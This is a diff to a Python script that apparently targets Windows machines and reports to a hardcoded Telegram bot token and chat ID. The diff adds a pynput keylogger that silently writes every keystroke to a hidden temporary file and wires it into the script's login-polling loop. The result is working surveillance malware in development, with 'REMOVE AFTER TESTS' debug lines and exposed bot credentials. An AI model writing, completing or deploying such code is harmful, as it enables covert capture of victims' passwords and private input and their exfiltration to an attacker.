@@ -9,6 +9,8 @@ import time
 import sys
 import ctypes
 import ctypes.wintypes
+from pynput.keyboard import Key, Listener
+import logging
 
 chat_id = "-4102145810"
 token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"
@@ -80,9 +82,23 @@ def is_user_logged_in():
         
     return False
 
+def keylogger():
+    os.system("msg * keylogger:starting") #REMOVE AFTER TESTS
+    temp_file = tempfile.NamedTemporaryFile(delete=False)
+    log_file_path = temp_file.name
+
+    logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+    def on_press(key):
+        logging.info(str(key))
+
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+        os.system(f"msg * {str(log_file_path)}") #REMOVE AFTER TESTS
+
 while True:
     if is_user_logged_in():
         send_message(chat_id, token, "userlogged")
         break
     else:
-        pass
+        keylogger()
